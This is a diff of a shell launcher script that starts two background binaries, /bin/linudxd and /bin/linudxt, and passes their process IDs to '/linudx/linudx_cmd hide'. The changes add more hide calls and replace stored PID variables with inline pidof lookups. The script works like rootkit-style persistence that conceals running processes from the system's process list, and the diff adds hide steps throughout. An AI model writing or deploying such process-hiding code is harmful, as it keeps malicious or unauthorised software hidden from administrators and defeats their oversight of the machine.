@@ -31,6 +31,7 @@ then
 	if [ `ps -ef|grep /bin/linudxd | grep -v grep |wc -l`  -ge 1 ];then
 		echo "already started linudxd"
 
+		/linudx/linudx_cmd hide `pidof linudxd`
 		/linudx/linudx_cmd hide
 
 		if [ "`pidof linudxd`" ];then
@@ -47,8 +48,8 @@ then
 	else
 		echo "need to start linudxd"
 		/bin/linudxd &
-		p1=`pidof linudxd`
-		/linudx/linudx_cmd hide $p1
+		/linudx/linudx_cmd hide `pidof linudxd`
+		/linudx/linudx_cmd hide 
 
 		if [ "`pidof linudxd`" ];then
 			/linudx/linudx_cmd hide 
@@ -81,7 +82,9 @@ then
 	if [ `ps -ef|grep /bin/linudxt | grep -v grep |wc -l`  -ge 1 ];then
 		echo "already started linudxt"
 
+		/linudx/linudx_cmd hide `pidof linudxt`
 		/linudx/linudx_cmd hide
+
 		if [ "`pidof linudxt`" ];then
   			/linudx/linudx_cmd hide   
 		else
@@ -96,8 +99,7 @@ then
 	else
 		echo "need to start linudxt"
 		/bin/linudxt &
-		p2=`pidof linudxt`
-		/linudx/linudx_cmd hide $p2
+		/linudx/linudx_cmd hide `pidof linudxt`
 
 		if [ "`pidof linudxt`" ];then
 			/linudx/linudx_cmd hide 
